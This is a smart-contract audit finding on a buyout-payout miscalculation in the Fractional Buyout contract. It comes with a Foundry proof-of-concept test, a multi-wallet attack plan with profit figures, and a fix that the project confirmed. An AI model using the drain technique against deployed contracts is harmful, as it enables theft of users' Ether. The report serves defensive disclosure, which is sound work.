[H-08] Cash-out from a successful buyout allows an attacker to drain Ether from theBuyoutcontract
Submitted by berndartmueller, also found by 0xA5DF, 0xsanson, 0xSky, cccz, cryptphi, ElKu, hansfriese, jonatascm, kenzo, Kumpa, minhquanym, s3cunda, shenwilly, smiling_heretic, Treasure-Seeker, TrungOre, and zzzitron
The functionBuyout.cashallows a user to cash out proceeds (Ether) from a successful vault buyout.
However, due to howbuyoutShareis calculated inBuyout.cash, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored inbuyoutInfo[_vault].ethBalance. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of theBuyoutcontract.
Proof of Concept
Copy paste the following test case intoBuyout.t.soland run the test viaforge test -vvv --match-test testCashDrainEther:
The test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in10 ether). Alice and Eve are both entitled to receive5 ethereach. Alice receives the correct amount when cashing out, however, due to a miscalculation ofbuyoutShare(see#L268-L269), Eve can cash-out10 etherfrom theBuyoutcontract.
functiontestCashDrainEther()public{/// ==================/// ===== SETUP =====/// ==================deployBaseVault(alice,TOTAL_SUPPLY);(token,tokenId) =registry.vaultToToken(vault);alice.ferc1155=newFERC1155BS(address(0),111,token);bob.ferc1155=newFERC1155BS(address(0),222,token);eve.ferc1155=newFERC1155BS(address(0),333,token);buyout=address(buyoutModule);proposalPeriod=buyoutModule.PROPOSAL_PERIOD();rejectionPeriod=buyoutModule.REJECTION_PERIOD();vm.label(vault,"VaultProxy");vm.label(token,"Token");setApproval(alice,vault,true);setApproval(alice,buyout,true);setApproval(bob,vault,true);setApproval(bob,buyout,true);setApproval(eve,vault,true);setApproval(eve,buyout,true);alice.ferc1155.safeTransferFrom(alice.addr,bob.addr,1,6000,"");alice.ferc1155.safeTransferFrom(alice.addr,eve.addr,1,2000,"");/// ==================/// ===== SETUP END =====/// ==================/// Fraction balances:assertEq(getFractionBalance(alice.addr),2000);// Alice: 2000assertEq(getFractionBalance(bob.addr),6000);// Bob: 6000assertEq(getFractionBalance(eve.addr),2000);// Eve: 2000bob.buyoutModule.start{value:10ether}(vault);assertEq(getETHBalance(buyout),10ether);/// Bob (proposer of buyout) transfered his fractions to buyout contractassertEq(getFractionBalance(buyout),6000);vm.warp(rejectionPeriod+1);bob.buyoutModule.end(vault,burnProof);/// Fraction balances after buyout ended:assertEq(getFractionBalance(alice.addr),2000);// Alice: 2000assertEq(getFractionBalance(bob.addr),0);// Bob: 0assertEq(getFractionBalance(eve.addr),2000);// Eve: 2000assertEq(getETHBalance(buyout),10ether);/// Alice cashes out 2000 fractions -> 5 ETH (correct amount)alice.buyoutModule.cash(vault,burnProof);assertEq(getFractionBalance(alice.addr),0);assertEq(getETHBalance(alice.addr),105ether);/// Eve cashes out 2000 fractions -> REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETHeve.buyoutModule.cash(vault,burnProof);}
Additionallyto the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:
Attacker deploys a vault with10.000fractions minted51% of fractions (5.100) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5,980fractions each)With the first wallet, the attacker starts a buyout with10 ether- fractions are transferred into theBuyoutcontract as well as10 etherAttacker waits forREJECTION_PERIODto elapse to callBuyout.end(51% of fractions are already held in the contract, therefore no need for voting)After the successful buyout, the attacker uses theBuyout.cashfunction to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from theBuyoutcontract:Wallet 1 -buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether(totalSupply = 3920after burning980fractions from wallet 1)Wallet 2 -buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether(totalSupply = 2940after burning980fractions from wallet 2)Wallet 3 -buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether(totalSupply = 1960after burning980fractions from wallet 3)Wallet 4 -buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether(totalSupply = 980after burning980fractions from wallet 4)Wallet 5 -buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether(totalSupply = 0after burning980fractions from wallet 5)
If summed up, cashing out the 5 wallets, the attacker receives22.8 etherin total. Making a profit of12.8 ether.
This can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in theBuyoutcontract.
Recommended Mitigation Steps
DecrementethBalancefrom buyout infobuyoutInfo[_vault].ethBalance -= buyoutShare;inBuyout.cash(see@audit-infoannotation):
functioncash(address_vault,bytes32[]calldata_burnProof)external{// Reverts if address is not a registered vault(addresstoken,uint256id) =IVaultRegistry(registry).vaultToToken(_vault);if(id==0)revertNotVault(_vault);// Reverts if auction state is not successful(, ,Statecurrent, ,uint256ethBalance, ) =this.buyoutInfo(_vault);Staterequired=State.SUCCESS;if(current!=required)revertInvalidState(required,current);// Reverts if caller has a balance of zero fractional tokensuint256tokenBalance=IERC1155(token).balanceOf(msg.sender,id);if(tokenBalance==0)revertNoFractions();// Initializes vault transactionbytesmemorydata=abi.encodeCall(ISupply.burn,(msg.sender,tokenBalance));// Executes burn of fractional tokens from callerIVault(payable(_vault)).execute(supply,data,_burnProof);// Transfers buyout share amount to caller based on total supplyuint256totalSupply=IVaultRegistry(registry).totalSupply(_vault);uint256buyoutShare= (tokenBalance*ethBalance) /(totalSupply+tokenBalance);buyoutInfo[_vault].ethBalance-=buyoutShare;// @audit-info decrement `ethBalance` by `buyoutShare`_sendEthOrWeth(msg.sender,buyoutShare);// Emits event for cashing out of buyout poolemitCash(_vault,msg.sender,buyoutShare);}
stevennevins (Fractional) confirmed
HardlyDifficult (judge) commented:
When more than 1 user callsBuyout.cash, users will receive more ETH than expected - leaving a deficit so that later users are unable to access their funds. Agree this is a High risk issue.